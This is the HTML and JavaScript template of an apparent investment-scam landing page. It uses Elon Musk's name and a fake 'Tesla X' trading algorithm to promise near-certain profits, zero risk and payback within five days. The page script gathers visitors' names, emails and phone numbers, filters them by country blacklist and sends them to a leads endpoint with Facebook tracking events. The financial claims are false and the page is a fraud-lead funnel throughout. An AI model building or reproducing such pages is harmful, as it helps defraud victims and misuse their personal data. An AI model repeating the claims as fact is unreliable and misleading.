<!DOCTYPE html>
<html lang="en">
    <head>
        <meta name="facebook-domain-verification" content="{{fb_domain_verification}}">
        
        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!--title-->
        <title>Join the Elon Musk's project!</title>
        
        <!--favicon icon-->
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        
        <!--google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,600,700%7COpen+Sans:400,600&amp;display=swap" rel="stylesheet">
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <!--custom css-->
        
        <link rel="stylesheet" href="css/font-awesome.min.css">

        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="css/responsive.css">
        <link rel="stylesheet" href="css/adict.css">

        <!-- form -->
        <link rel="stylesheet" href="css/form.css">

        <!-- Facebook Pixel Code -->
        <script>
            !(function (f, b, e, v, n, t, s) {
                if (f.fbq) return;
                n = f.fbq = function () {
                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
                };
                if (!f._fbq) f._fbq = n;
                n.push = n;
                n.loaded = !0;
                n.version = "2.0";
                n.queue = [];
                t = b.createElement(e);
                t.async = !0;
                t.src = v;
                s = b.getElementsByTagName(e)[0];
                s.parentNode.insertBefore(t, s);
            })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
            {*fbpixels*}
            fbq("track", "PageView");
        </script>
        <noscript>
            <img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id={{fbpixel}}&amp;ev=PageView&amp;noscript=1">
        </noscript>
        <!-- End Facebook Pixel Code -->
    </head>

    <body>
        <!--header section start-->
        <header class="header">
            <!--start navbar-->
            <nav class="navbar navbar-expand-lg fixed-top bg-transparent">
                <div class="container">
                    <div class="col-md-12 text-center">
                        <img src="images/logo.webp" alt="logo" style="max-width: 250px; animation: logo_animation;">
                    </div>
                </div>
            </nav>
        </header>
        <!--header section end-->

        <!--body content wrap start-->
        <div class="main">
            <!--hero background image with content slider start-->
            <section class="hero-section hero-bg-2 ptb-100">
                <div class="container">
                    <div class="row align-items-end justify-content-between pt-5 pb-5">
                        <div class="col-md-6 col-lg-7">
                            <div class="hero-content-left text-white">
                                <h2 class="text-white text-center">Join the Elon Musk's project!</h2>

                                <script src="js/Mn0lqdxs-voou8tK3.js"></script>

                            </div>
                        </div>
                        <div class="col-md-6 col-lg-5">
                            <div class="sign-up-form-wrap position-relative rounded p-5 gray-light-bg shadow-lg">
                                
                                <form class="register-form" id="reg_form" name="reg_form">
                                    <div class="form-input-main">
                                        <input type="text" name="first_name" class="form-input" placeholder="Name" required>
                                    </div>
                                    <div class="form-input-main">
                                        <input type="text" name="last_name" class="form-input" placeholder="Surname" required>
                                    </div>

                                    <div class="form-input-main">
                                        <input type="email" name="email" placeholder="Email" required>
                                    </div>

                                    <div class="form-input-main">
                                        <input type="hidden" name="phonePrefix" value="7">
                                        <input type="tel" placeholder="Number" name="phone" class="form-input" autocomplete="off" required>
                                    </div>

                                    <div>
                                        <button type="submit" name="submitBtn">
                                            Register
                                        </button>
                                    </div>
                                </form>
                            </div>
                           
                        </div>
                    </div>
                </div>
            </section>
            <!--hero background image with content slider end-->

            <!--promo section start-->
            <section class="promo-block ptb-100">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-4 col-md-4">
                            <div class="core-services-single rounded p-5 my-md-3 my-lg-3 my-sm-0 shadow-lg">
                                <span class="fa fa-line-chart icon-md mb-3 d-block color-secondary"></span>
                                <h5>Tesla X System</h5>
                                <p class="mb-0">
                                    The system is based on a unique algorithm with an accuracy of 98.7%
                                </p>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-4">
                            <div class="core-services-single rounded p-5 my-md-3 my-lg-3 my-sm-0 shadow-lg">
                                <span class="fa fa-briefcase icon-md mb-3 d-block color-secondary"></span>
                                <h5>Profitable Investment</h5>
                                <p class="mb-0">
                                    Tesla X investment is fully paid back within 5 days
                                </p>
                            </div>
                        </div>
                        <div class="col-lg-4 col-md-4">
                            <div class="core-services-single rounded p-5 my-md-3 my-lg-3 my-sm-0 shadow-lg">
                                <span class="fa fa-users icon-md mb-3 d-block color-secondary"></span>
                                <h5>Strong team</h5>
                                <p class="mb-0">
                                    Tesla X members work alongside professional experts by phone
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!--promo section end-->

            <!--about us section start-->
            <section class="about-us-section ptb-100 gray-light-bg">
                <div class="container">
                    <div class="row justify-content-around">
                        <div class="col-md-12 col-lg-6">
                            <div class="img-wrap">
                                <img src="images/about-us-2.webp" alt="about" class="img-fluid rounded shadow">
                            </div>
                        </div>
                        <div class="col-md-12 col-lg-5">
                            <div class="about-content-right mb-md-4 mb-lg-0">
                                <h2>Why Tesla X ?</h2>
                                <p>
                                    Autopilot was developed for the car, but it started to be used in the financial market. Instant analysis allows you to anticipate market fluctuations and open a deal, profitable for you.
                                </p>
                                <h5>Advantages of investing with Project Tesla X</h5>
                                <p></p>
                                <ul class="list-unstyled tech-feature-list mb-4">
                                    <li class="py-1">
                                        <span class="ti-control-forward mr-2 color-secondary"></span>
                                        <strong>Simplicity:</strong> full automation of all processes, automatic setup for new users and help from phone specialists.
                                    </li>
                                    <li class="py-1">
                                        <span class="ti-control-forward mr-2 color-secondary"></span>
                                        <strong>Accessibility:</strong> you can connect from anywhere in the world.
                                    </li>
                                    <li class="py-1">
                                        <span class="ti-control-forward mr-2 color-secondary"></span>
                                        <strong>Reliability:</strong> An algorithm calculates 92 100 possible events per second and forecasts the most profitable deals. All the risks are reduced to zero, because its accuracy is up to 98%.
                                    </li>
                                    <li class="py-1">
                                        <span class="ti-control-forward mr-2 color-secondary"></span>
                                        <strong>Speed:</strong> Within the first few days you'll see the result.
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!--about us section end-->
        </div>
        <!--body content wrap end-->

        <!--footer section start-->
        <footer class="footer-section">
            <!--footer top start-->
            <section class="hero-section hero-bg-1 ptb-100">
                <div class="container">
                    <div class="row align-items-center justify-content-between pt-5 pb-5">
                        <div class="col-md-6 col-lg-7"></div>
                        <div class="col-md-6 col-lg-5">
                            <div class="sign-up-form-wrap position-relative rounded p-5 gray-light-bg shadow-lg" id="main_form">
                                <form class="register-form register-form2" id="reg_form" name="reg_form">
                                    <div class="form-input-main">
                                        <input type="text" name="first_name" class="form-input" placeholder="Name" required>
                                    </div>
                                    <div class="form-input-main">
                                        <input type="text" name="last_name" class="form-input" placeholder="Surname" required>
                                    </div>

                                    <div class="form-input-main">
                                        <input type="email" name="email" placeholder="Email" required>
                                    </div>

                                    <div class="form-input-main">
                                        <input type="hidden" name="phonePrefix" value="7">
                                        <input type="tel" name="phone" class="form-input" placeholder="Number" autocomplete="off" required>
                                    </div>

                                    <div>
                                        <button type="submit" name="submitBtn">
                                            Register
                                        </button>
                                    </div>
                                </form>
                                
                            </div>

                            
                        </div>
                    </div>
                </div>
            </section>
            <!--footer top end-->

            <div class="container">
                <div class="row align-items-center justify-content-between">
                    <div class="col-md-12">
                        <div class="pr">
                            <!--<img src="./img/pr.png" width="100%" alt="PRLogo">-->
                        </div>
                        <p class="text-center pb-0 mb-0">
                            <br>
                            email: {{email}}
                            <br>Tesla-X
                            <script>
                                document.write(new Date().getFullYear());
                            </script>
                            <br>                        
                        </p>
                    </div>
                </div>
            </div>
        </footer>
        <!--footer section end-->

        <!--jQuery-->
        <script src="js/jquery.min.js"></script>
        <script src="js/scripts.js"></script>

        <!-- intlTelInput -->
        <script src="js/intlTelInput.min.js"></script>
        <link rel="stylesheet" href="css/intlTelInput.min.css">

        <style>
            .error {
                background-color: rgba(255, 0, 0, 0.2) !important;
            }
            .valid {
                background-color: rgba(0, 255, 0, 0.2) !important;
            }
            .iti{
                width: 100%;
            }
            .modal_phone {
                opacity: 1;
                position: fixed;
                top: 0;
                bottom: 0;
                right: 0;
                left: 0;
                z-index: 99999;
                display: none;
                outline: 0;
                padding-right: 15px;
                justify-content: center;
                align-items: center;
                background-color: rgba(0, 0, 0, 0.4);
                overflow-x: hidden;
                overflow-y: auto;
                color: #000;
            }

            .modal_phone.open_phone {
                display: flex;
            }

            .modal-open_phone {
                overflow: hidden;
            }

            .modal-dialog_phone {
                position: relative;
                width: 100%;
                max-width: 32rem;
                padding: 1rem;
                box-sizing: border-box;
            }

            .modal-content_phone {
                display: flex;
                flex-direction: column;
                pointer-events: auto;
                background-color: #fff;
                background-clip: padding-box;
                border: 1px solid rgba(0, 0, 0, 0.2);
                border-radius: 0.3rem;
                outline: 0;
            }

            .modal-header_phone {
                display: flex;
                align-items: center;
                padding: 1rem 1rem;
            }

            .modal-header_phone {
                justify-content: space-between;
                border-top-left-radius: 0.3rem;
                border-top-right-radius: 0.3rem;
            }

            .modal-body_phone {
                position: relative;
                flex: 1 1 auto;
                padding: 1rem;
            }

            .modal-title_phone {
                font-size: 1.25rem;
                font-weight: 600;
            }

            .close-button_phone {
                font-size: 1.5rem;
                font-weight: 700;
                line-height: 1;
                opacity: 0.5;
                background-color: transparent;
                border: 0;
                cursor: pointer;
                padding: 1rem 1rem;
                margin: -1rem -1rem -1rem auto;
            }
        </style>

        <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
            <div class="modal-dialog_phone">
                <div class="modal-content_phone">
                    <div class="modal-header_phone">
                        <h5 class="modal-title_phone">Wrong phone</h5>
                        <button type="button" class="close-button_phone" id="close-button_phone">×</button>
                    </div>
                    <div class="modal-body_phone">
                        Sorry! The program is not supported in your region. Enter your European membership number
                    </div>
                </div>
            </div>
        </div>

        <script>
            const formJsonData = '{*form*}';
            const formHeaderData = '{*form_header*}';
            const formFooterData = '{*form_footer*}';

            const formDiv = document.querySelector('.register-form');
            const formDiv2 = document.querySelector('.register-form2');

            if (formJsonData.length > 0) {
                const formJSON = JSON.parse(formJsonData);
        
                formDiv.innerHTML = '';
                formDiv2.innerHTML = '';

                formJSON.forEach(input => {
                    switch (input.name) {
                        case('first_name'):
                        case('last_name'):
                            formDiv.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main">
                                    <input class="form-input" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" ${input.isRequired && 'required'} />
                                </div>`);
                            formDiv2.insertAdjacentHTML('beforeend',
                                `<div class="form-input-main">
                                    <input class="form-input" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" ${input.isRequired && 'required'} />
                                </div>`);
                        break;

                        case('phone'):
                            formDiv.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main">
                                    <input class="form-input" name="${input.name}" type="${input.type}"  ${input.isRequired && 'required'}  />
                                </div>`);
                            formDiv2.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main">
                                    <input class="form-input" name="${input.name}" type="${input.type}"  ${input.isRequired && 'required'}  />
                                </div>`);
                        break;

                        case('email'):
                            formDiv.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main">
                                    <input class="form-input ${input.name}" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" ${input.isRequired && 'required'} />
                                </div>`);
                            formDiv2.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main">
                                    <input class="form-input ${input.name}" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" ${input.isRequired && 'required'} />
                                </div>`);
                        break;

                        case('submit'):
                            formDiv.insertAdjacentHTML('beforeend', `<button name="submitBtn" id="submitBtn1" type="submit">${input.placeholder}</button>`);
                            formDiv2.insertAdjacentHTML('beforeend', `<button name="submitBtn" id="submitBtn1" type="submit">${input.placeholder}</button>`);
                        break;

                        case('nationality'):
                            const countries=[{value:"",label:input.placeholder},{label:"Афганистан",value:"AF"},{label:"Албания",value:"ALOB"},{label:"Алжир",value:"DZ"},{label:"Американское Самоа",value:"AS"},{label:"Andorra",value:"AD"},{label:"Angola",value:"AO"},{label:"Anguilla",value:"AI"},{label:"Antarctica",value:"AQ"},{label:"Antigua and Barbuda",value:"AG"},{label:"Argentina",value:"AR"},{label:"Armenia",value:"AM"},{label:"Aruba",value:"AW"},{label:"Australia",value:"AU"},{label:"Austria",value:"AT"},{label:"Azerbaijan",value:"AZ"},{label:"Bahamas",value:"BS"},{label:"Bahrain",value:"BH"},{label:"Bangladesh",value:"BD"},{label:"Barbados",value:"BB"},{label:"Belarus",value:"BY"},{label:"Belgium",value:"BE"},{label:"Belize",value:"BZ"},{label:"Benin",value:"BJ"},{label:"Bermuda",value:"BM"},{label:"Bhutan",value:"BT"},{label:"Bolivia, Plurinational State of",value:"BO"},{label:"Bonaire, Sint Eustatius and Saba",value:"BQ"},{label:"Bosnia and Herzegovina",value:"BA"},{label:"Botswana",value:"BW"},{label:"Bouvet Island",value:"BV"},{label:"Brazil",value:"BR"},{label:"British Indian Ocean Territory",value:"IO"},{label:"Brunei Darussalam",value:"BN"},{label:"Bulgaria",value:"BG"},{label:"Burkina Faso",value:"BF"},{label:"Burundi",value:"BI"},{label:"Cambodia",value:"KH"},{label:"Cameroon",value:"CM"},{label:"Canada",value:"CA"},{label:"Cape Verde",value:"CV"},{label:"Cayman Islands",value:"KY"},{label:"Central African Republic",value:"CF"},{label:"Chad",value:"TD"},{label:"Chile",value:"CL"},{label:"China",value:"CN"},{label:"Christmas Island",value:"CX"},{label:"Cocos (Keeling) Islands",value:"CC"},{label:"Colombia",value:"CO"},{label:"Comoros",value:"KM"},{label:"Congo",value:"CG"},{label:"Congo, the Democratic Republic of the",value:"CD"},{label:"Cook Islands",value:"CK"},{label:"Costa Rica",value:"CR"},{label:"Croatia",value:"HR"},{label:"Cuba",value:"CU"},{label:"Curaçao",value:"CW"},{label:"Cyprus",value:"CY"},{label:"Czech Republic",value:"CZ"},{label:"Côte d'Ivoire",value:"CI"},{label:"Denmark",value:"DK"},{label:"Djibouti",value:"DJ"},{label:"Dominica",value:"DM"},{label:"Dominican Republic",value:"DO"},{label:"Ecuador",value:"EC"},{label:"Egypt",value:"EG"},{label:"El Salvador",value:"SV"},{label:"Equatorial Guinea",value:"GQ"},{label:"Eritrea",value:"ER"},{label:"Estonia",value:"EE"},{label:"Ethiopia",value:"ET"},{label:"Falkland Islands (Malvinas)",value:"FK"},{label:"Faroe Islands",value:"FO"},{label:"Fiji",value:"FJ"},{label:"Finland",value:"FI"},{label:"France",value:"FR"},{label:"French Guiana",value:"GF"},{label:"French Polynesia",value:"PF"},{label:"French Southern Territories",value:"TF"},{label:"Gabon",value:"GA"},{label:"Gambia",value:"GM"},{label:"Georgia",value:"GE"},{label:"Germany",value:"DE"},{label:"Ghana",value:"GH"},{label:"Gibraltar",value:"GI"},{label:"Greece",value:"GR"},{label:"Greenland",value:"GL"},{label:"Grenada",value:"GD"},{label:"Guadeloupe",value:"GP"},{label:"Guam",value:"GU"},{label:"Guatemala",value:"GT"},{label:"Guernsey",value:"GG"},{label:"Guinea",value:"GN"},{label:"Guinea-Bissau",value:"GW"},{label:"Guyana",value:"GY"},{label:"Haiti",value:"HT"},{label:"Heard Island and McDonald Islands",value:"HM"},{label:"Holy See (Vatican City State)",value:"VA"},{label:"Honduras",value:"HN"},{label:"Hong Kong",value:"HK"},{label:"Hungary",value:"HU"},{label:"Iceland",value:"IS"},{label:"India",value:"IN"},{label:"Indonesia",value:"ID"},{label:"Iran, Islamic Republic of",value:"IR"},{label:"Iraq",value:"IQ"},{label:"Ireland",value:"IE"},{label:"Isle of Man",value:"IM"},{label:"Israel",value:"IL"},{label:"Italy",value:"IT"},{label:"Jamaica",value:"JM"},{label:"Japan",value:"JP"},{label:"Jersey",value:"JE"},{label:"Jordan",value:"JO"},{label:"Kazakhstan",value:"KZ"},{label:"Kenya",value:"KE"},{label:"Kiribati",value:"KI"},{label:"Korea, Democratic People's Republic of",value:"KP"},{label:"Korea, Republic of",value:"KR"},{label:"Kuwait",value:"KW"},{label:"Kyrgyzstan",value:"KG"},{label:"Lao People's Democratic Republic",value:"LA"},{label:"Latvia",value:"LV"},{label:"Lebanon",value:"LB"},{label:"Lesotho",value:"LS"},{label:"Liberia",value:"LR"},{label:"Libya",value:"LY"},{label:"Liechtenstein",value:"LI"},{label:"Lithuania",value:"LT"},{label:"Luxembourg",value:"LU"},{label:"Macao",value:"MO"},{label:"Macedonia, the former Yugoslav Republic of",value:"MK"},{label:"Madagascar",value:"MG"},{label:"Malawi",value:"MW"},{label:"Malaysia",value:"MY"},{label:"Maldives",value:"MV"},{label:"Mali",value:"ML"},{label:"Malta",value:"MT"},{label:"Marshall Islands",value:"MH"},{label:"Martinique",value:"MQ"},{label:"Mauritania",value:"MR"},{label:"Mauritius",value:"MU"},{label:"Mayotte",value:"YT"},{label:"Mexico",value:"MX"},{label:"Micronesia, Federated States of",value:"FM"},{label:"Moldova, Republic of",value:"MD"},{label:"Monaco",value:"MC"},{label:"Mongolia",value:"MN"},{label:"Montenegro",value:"ME"},{label:"Montserrat",value:"MS"},{label:"Morocco",value:"MA"},{label:"Mozambique",value:"MZ"},{label:"Myanmar",value:"MM"},{label:"Namibia",value:"NA"},{label:"Nauru",value:"NR"},{label:"Nepal",value:"NP"},{label:"Netherlands",value:"NL"},{label:"New Caledonia",value:"NC"},{label:"New Zealand",value:"NZ"},{label:"Nicaragua",value:"NI"},{label:"Niger",value:"NE"},{label:"Nigeria",value:"NG"},{label:"Niue",value:"NU"},{label:"Norfolk Island",value:"NF"},{label:"Northern Mariana Islands",value:"MP"},{label:"Norway",value:"NO"},{label:"Oman",value:"OM"},{label:"Pakistan",value:"PK"},{label:"Palau",value:"PW"},{label:"Palestine, State of",value:"PS"},{label:"Panama",value:"PA"},{label:"Papua New Guinea",value:"PG"},{label:"Paraguay",value:"PY"},{label:"Peru",value:"PE"},{label:"Philippines",value:"PH"},{label:"Pitcairn",value:"PN"},{label:"Poland",value:"PL"},{label:"Portugal",value:"PT"},{label:"Puerto Rico",value:"PR"},{label:"Qatar",value:"QA"},{label:"Romania",value:"RO"},{label:"Russian Federation",value:"RU"},{label:"Rwanda",value:"RW"},{label:"Réunion",value:"RE"},{label:"Saint Barthélemy",value:"BL"},{label:"Saint Helena, Ascension and Tristan da Cunha",value:"SH"},{label:"Saint Kitts and Nevis",value:"KN"},{label:"Saint Lucia",value:"LC"},{label:"Saint Martin (French part)",value:"MF"},{label:"Saint Pierre and Miquelon",value:"PM"},{label:"Saint Vincent and the Grenadines",value:"VC"},{label:"Samoa",value:"WS"},{label:"San Marino",value:"SM"},{label:"Sao Tome and Principe",value:"ST"},{label:"Saudi Arabia",value:"SA"},{label:"Senegal",value:"SN"},{label:"Serbia",value:"RS"},{label:"Seychelles",value:"SC"},{label:"Sierra Leone",value:"SL"},{label:"Singapore",value:"SG"},{label:"Sint Maarten (Dutch part)",value:"SX"},{label:"Slovakia",value:"SK"},{label:"Slovenia",value:"SI"},{label:"Solomon Islands",value:"SB"},{label:"Somalia",value:"SO"},{label:"South Africa",value:"ZA"},{label:"South Georgia and the South Sandwich Islands",value:"GS"},{label:"South Sudan",value:"SS"},{label:"Spain",value:"ES"},{label:"Sri Lanka",value:"LK"},{label:"Sudan",value:"SD"},{label:"Suriname",value:"SR"},{label:"Svalbard and Jan Mayen",value:"SJ"},{label:"Swaziland",value:"SZ"},{label:"Sweden",value:"SE"},{label:"Switzerland",value:"CH"},{label:"Syrian Arab Republic",value:"SY"},{label:"Taiwan, Province of China",value:"TW"},{label:"Tajikistan",value:"TJ"},{label:"Tanzania, United Republic of",value:"TZ"},{label:"Thailand",value:"TH"},{label:"Timor-Leste",value:"TL"},{label:"Togo",value:"TG"},{label:"Tokelau",value:"TK"},{label:"Tonga",value:"TO"},{label:"Trinidad and Tobago",value:"TT"},{label:"Tunisia",value:"TN"},{label:"Turkey",value:"TR"},{label:"Turkmenistan",value:"TM"},{label:"Turks and Caicos Islands",value:"TC"},{label:"Tuvalu",value:"TV"},{label:"Uganda",value:"UG"},{label:"Ukraine",value:"UA"},{label:"United Arab Emirates",value:"AE"},{label:"United Kingdom",value:"GB"},{label:"United States",value:"US"},{label:"United States Minor Outlying Islands",value:"UM"},{label:"Uruguay",value:"UY"},{label:"Uzbekistan",value:"UZ"},{label:"Vanuatu",value:"VU"},{label:"Venezuela, Bolivarian Republic of",value:"VE"},{label:"Viet Nam",value:"VN"},{label:"Virgin Islands, British",value:"VG"},{label:"Virgin Islands, U.S.",value:"VI"},{label:"Wallis and Futuna",value:"WF"},{label:"Western Sahara",value:"EH"},{label:"Yemen",value:"YE"},{label:"Zambia",value:"ZM"},{label:"Zimbabwe",value:"ZW"},{label:"Åland Islands",value:"AX"}];
                            formDiv.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main"><label for="${input.name}">${input.placeholder}
                                        <select class="form-input" name="${input.name}" id="${input.name}" ${input.isRequired && 'required'}>
                                            ${countries.map(item => `<option value="${item.value}">${item.label}</option>`)}
                                        </select>
                                    </label>
                                </div>`);
                            formDiv2.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main"><label for="${input.name}">${input.placeholder}
                                        <select class="form-input" name="${input.name}" id="${input.name}" ${input.isRequired && 'required'}>
                                            ${countries.map(item => `<option value="${item.value}">${item.label}</option>`)}
                                        </select>
                                    </label>
                                </div>`);
                        break;

                        default:
                            formDiv.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main"><label for="${input.name}">
                                        <input class="${input.name} form-input" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" id="${input.name}" ${input.isRequired && 'required'} />
                                    ${input.label}</label>
                                </div>`);
                            formDiv2.insertAdjacentHTML('beforeend', 
                                `<div class="form-input-main"><label for="${input.name}2">
                                        <input class="${input.name} form-input" name="${input.name}" placeholder="${input.placeholder}" type="${input.type}" id="${input.name}2" ${input.isRequired && 'required'} />
                                    ${input.label}</label>
                                </div>`);
                        break;
                    }
                })
            }
        
            const form = formDiv.closest('.register-form');
            const form2 = formDiv2.closest('.register-form2');

            if (formHeaderData.length > 0) {
                form.insertAdjacentHTML('afterbegin', `<h3 class="form-header-text">${formHeaderData}</h3>`);
                form2.insertAdjacentHTML('afterbegin', `<h3 class="form-header-text">${formHeaderData}</h3>`);
            }
        
            if (formFooterData.length > 0) {
                form.insertAdjacentHTML('beforeend', `<p class="form-footer-text">${formFooterData}</p>`);
                form2.insertAdjacentHTML('beforeend', `<p class="form-footer-text">${formFooterData}</p>`);
            }
        
            const openModal = () => {
                document.getElementById("modal_phone").classList.add("open_phone");
                document.body.classList.add("modal-open_phone");
            };
        
            const closeModal = () => {
                document.getElementById("modal_phone").classList.remove("open_phone");
                document.body.classList.remove("modal-open_phone");
            };
        
            document.getElementById("close-button_phone").addEventListener("click", closeModal);
        
            $(document).ready(function () {
                let phonePrefix = "7";
        
                $.ajax({
                    url: '{{protocol}}://{{base_url}}/api/geolocation',
                    dataType: "json",
                    success: function (result) {
                        $('input[name="phone"]').each(function (input) {
                            let iti = intlTelInput(this, {
                                ...result.data,
                                autoHideDialCode: "true",
                                customContainer: "phoneWrapper",
                                autoPlaceholder: "aggressive",
                                separateDialCode: "false",
                                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.12/js/utils.min.js",
                            });
                            phonePrefix = iti.getSelectedCountryData().dialCode;
                            $(this).on("countrychange", function () {
                                phonePrefix = iti.getSelectedCountryData().dialCode;
                            });
                            $("select[name = nationality]").val(result.data.initialCountry.toUpperCase());
                            return iti;
                        });
                    },
                });
        
                function validateEmail(email) {
                    return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(String(email).toLowerCase());
                }
        
                function changInputHandler(e) {
                    if (e.target.value.length === 0) {
                        this.classList.remove("valid");
                        this.classList.add("error");
                        return;
                    }
                    this.classList.add("valid");
                    this.classList.remove("error");
                }
        
                function changEmailHandler(e) {
                    if (validateEmail(e.target.value) === false) {
                        this.classList.add("error");
                        this.classList.remove("valid");
                        return;
                    }
                    this.classList.add("valid");
                    this.classList.remove("error");
                }
        
                const { fbclid } = parseURLParams(location.href);
                $(".form-input").keyup(changInputHandler);
                $(".form-input").change(changInputHandler);
                $("input[name = email]").keyup(changEmailHandler);
                $("input[name = email]").change(changEmailHandler);
                $("form#reg_form").submit(function (e) {
                    e.preventDefault();
                    const form = $(this);
                    const first_name = form.find("input[name = first_name]");
                    const last_name = form.find("input[name = last_name]");
                    const nationality = form.find("select[name = nationality]")?.val();
                    const email = form.find("input[name = email]");
                    const phone = form.find("input[name = phone]");
        
                    let isError = false;
                    if (first_name.val() === "") {
                        first_name.addClass("error").val("").attr("placeholder", errorPlaceholders.first_name);
                        isError = true;
                    }
        
                    if (last_name.val() === "") {
                        last_name.addClass("error").val("").attr("placeholder", errorPlaceholders.last_name);
                        isError = true;
                    }
        
                    if (phone.val() === "") {
                        phone.addClass("error").val("").attr("placeholder", errorPlaceholders.phone);
                        isError = true;
                    }
        
                    if (validateEmail(email.val()) === false) {
                        email.addClass("error").val("").attr("placeholder", errorPlaceholders.email);
                        isError = true;
                    }
        
                    if (isError === true) {
                        return;
                    }
        
                    const button = $("button[name=submitBtn]");
                    button.prop("disabled", true);
        
                    const checkNumber = new Promise((resolve, reject) => {
                        $.ajax({
                            url: `{{protocol}}://{{base_url}}/api/phone/validate`,
                            type: "post",
                            contentType: "application/json",
                            data: JSON.stringify({
                                phone: `${phonePrefix}${phone.val()}`,
                            }),
                            success: resolve,
                            error: reject,
                        });
                    });
        
                    const getBlacklist = new Promise((resolve, reject) => {
                        $.ajax({
                            url: "{{protocol}}://{{base_url}}/api/blacklist",
                            type: "get",
                            contentType: "application/json",
                            success: function (res) {
                                resolve(res);
                            },
                            error: function (error) {
                                reject(error);
                            },
                        });
                    });
        
                    Promise.all([checkNumber, getBlacklist])
                        .then(([checkNumber, blacklist]) => {
                            if (checkNumber.status === false) {
                                phone.addClass("error").removeClass("valid").val("").attr("placeholder", errorPlaceholders.phone);
                                throw new Error("check number error");
                            }
        
                            if (blacklist.status === false) {
                                throw new Error("get blacklist error");
                            }
        
                            if (blacklist.data.blacklist.includes(checkNumber.data.country_code.toLowerCase())) {
                                openModal();
                                setTimeout(closeModal, 5000);
                                throw new Error("forbidden country");
                            }
                            if (nationality && blacklist.data.blacklist.includes(nationality.toLowerCase())) {
                              window.location.href = "/success.html";
                              return;
                            }
        
                            $.ajax({
                                url: "{{protocol}}://{{base_url}}/api/leads",
                                type: "post",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    first_name: first_name.val(),
                                    last_name: last_name.val(),
                                    email: email.val(),
                                    phone: phone.val(),
                                    country: checkNumber.data.country_code,
                                    nationality: nationality,                                    
                                    click_id: fbclid,
                                }),
                                dataType: "json",
                                success: function (res) {
                                    if (res.status === true) {
                                    fbq("track", "Lead");
                                    fbq("track", "CompleteRegistration");
                                    switch (res.data.proceedWith) {
                                            case "success":
                                                window.location.href = "/success.html";
                                                break;
                                            case "exist":
                                                window.location.href = "/error.html";
                                                break;
                                            case "redirect":
                                                window.location.href = res.data.redirectUrl;
                                                break;
                                            default:
                                                window.location.href = "/success.html";
                                        }
                                    } else {
                                        alert("Error! API Error");
                                        button.prop("disabled", false);
                                    }
                                },
                                error: function (error) {
                                    button.prop("disabled", false);
                                    console.error(error);
                                },
                            });
                        })
                        .catch((error) => {
                            button.prop("disabled", false);
                            console.error(error);
                        });
                });
            });
        
            function parseURLParams(url) {
                var queryString = url ? url.split("?")[1] : window.location.search.slice(1);
                var obj = {};
                if (queryString) {
                    queryString = queryString.split("#")[0];
                    var arr = queryString.split("&");
                    for (var i = 0; i < arr.length; i++) {
                        var a = arr[i].split("=");
                        var paramName = a[0];
                        var paramValue = typeof a[1] === "undefined" ? true : a[1];
                        if (paramName.match(/\[(\d+)?\]$/)) {
                            var key = paramName.replace(/\[(\d+)?\]/, "");
                            if (!obj[key]) obj[key] = [];
                            if (paramName.match(/\[\d+\]$/)) {
                                var index = /\[(\d+)\]/.exec(paramName)[1];
                                obj[key][index] = paramValue;
                            } else {
                                obj[key].push(paramValue);
                            }
                        } else {
                            if (!obj[paramName]) {
                                obj[paramName] = paramValue;
                            } else if (obj[paramName] && typeof obj[paramName] === "string") {
                                obj[paramName] = [obj[paramName]];
                                obj[paramName].push(paramValue);
                            } else {
                                obj[paramName].push(paramValue);
                            }
                        }
                    }
                }
        
                return obj;
            }
        </script>
        <!-- intlTelInput END-->

        {*demonetization*}
    </body>
</html>
